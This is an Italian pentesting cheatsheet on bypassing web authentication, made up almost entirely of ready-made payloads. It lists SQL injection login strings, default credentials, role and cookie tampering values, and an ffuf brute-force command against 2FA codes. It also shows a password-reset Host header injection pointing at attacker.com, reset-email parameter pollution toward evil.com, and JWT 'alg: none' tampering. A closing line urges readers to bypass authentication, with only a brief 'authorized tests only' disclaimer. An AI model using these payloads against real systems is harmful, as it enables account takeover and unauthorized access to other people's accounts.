# 🔐 Cheatsheet Bypass Autenticazione

```
   █████╗ ██╗   ██╗████████╗██╗  ██╗    ██████╗ ██╗   ██╗██████╗  █████╗ ███████╗███████╗
  ██╔══██╗██║   ██║╚══██╔══╝██║  ██║    ██╔══██╗╚██╗ ██╔╝██╔══██╗██╔══██╗██╔════╝██╔════╝
  ███████║██║   ██║   ██║   ███████║    ██████╔╝ ╚████╔╝ ██████╔╝███████║███████╗███████╗
  ██╔══██║██║   ██║   ██║   ██╔══██║    ██╔══██╗  ╚██╔╝  ██╔═══╝ ██╔══██║╚════██║╚════██║
  ██║  ██║╚██████╔╝   ██║   ██║  ██║    ██████╔╝   ██║   ██║     ██║  ██║███████║███████║
  ╚═╝  ╚═╝ ╚═════╝    ╚═╝   ╚═╝  ╚═╝    ╚═════╝    ╚═╝   ╚═╝     ╚═╝  ╚═╝╚══════╝╚══════╝
```

---

## 🔍 Tecniche di Login Bypass

### SQL Injection
```sql
admin'--
admin' #
' OR '1'='1
' OR 1=1--
") OR ("1"="1
```

### Credenziali di Default
```
admin:admin
admin:password
admin:123456
root:root
test:test
guest:guest
```

### Manipolazione Parametri
```http
# Cambia tipo utente
user_type=admin
role=administrator
isAdmin=true
admin=1

# Salta verifica
verified=true
mfa_verified=true
```

---

## 🔑 Bypass 2FA/MFA

### Manipolazione della Risposta
```http
# Cambia false in true
{"success": false} → {"success": true}
{"2fa_valid": false} → {"2fa_valid": true}
```

### Manipolazione dello Status Code
```http
# Se 401/403, prova a cambiare in 200
# Usando un proxy per modificare la risposta
```

### Navigazione Diretta
```http
# Dopo login, salta pagina 2FA
/login → /2fa → /dashboard
# Prova ad andare direttamente su /dashboard
```

### Bruteforce Codice
```bash
# Codici a 4 cifre
ffuf -u https://target.com/2fa -X POST \
  -d "code=FUZZ" -w <(seq -w 0000 9999)
```

### Riutilizzo Codice
```http
# Prova a usare codici vecchi/scaduti
# Prova stesso codice più volte
```

### Valori Null/Vuoti
```json
{"2fa_code": ""}
{"2fa_code": null}
{"2fa_code": "000000"}
```

---

## 🔓 Bypass Reset Password

### Host Header Injection
```http
POST /reset HTTP/1.1
Host: attacker.com
X-Forwarded-Host: attacker.com

email=victim@target.com
```

### Manipolazione dei Token
```http
# Token prevedibili
token=1
token=admin
token=base64(user_id)

# Riutilizzo token
# Usa il tuo token reset con l'email della vittima
```

### Parameter Pollution
```http
email=attacker@evil.com&email=victim@target.com
email[]=attacker@evil.com&email[]=victim@target.com
```

### Manipolazione della Risposta
```json
// Trova token nella risposta
{"token": "abc123", "email": "victim@target.com"}
```

---

## 🛡️ Bypass Sessione/Cookie

### Manipolazione Cookie
```http
# Cambia valori
Cookie: isAdmin=false → isAdmin=true
Cookie: user_id=123 → user_id=1
Cookie: role=user → role=admin
```

### Manipolazione JWT
```json
// Cambia claims
{"role": "user"} → {"role": "admin"}
{"alg": "HS256"} → {"alg": "none"}
```

### Session Fixation
```http
# Imposta la sessione dell'attaccante alla vittima
# La vittima effettua login con la session ID dell'attaccante
```

---

## 📊 Riferimento Rapido

| Tipo Bypass | Tecnica |
|-------------|---------|
| Login | SQLi, credenziali default |
| 2FA | Manipolazione risposta, brute |
| Reset Password | Host header, riutilizzo token |
| Sessione | Tampering cookie, JWT |

### Punti di Vulnerabilità Comuni
```
- Form di login
- Flussi di reset password
- Implementazioni 2FA/MFA
- Funzioni "remember me"
- Verifica account
- Implementazioni OAuth
```

---

## 📚 Risorse

- [PortSwigger Authentication](https://portswigger.net/web-security/authentication)
- [HackTricks Auth Bypass](https://book.hacktricks.xyz/pentesting-web/authentication-bypass)

---

<p align="center">
  <b>🔐 Bypassa l'Autenticazione!</b><br>
  <i>Solo per test autorizzati!</i>
</p>
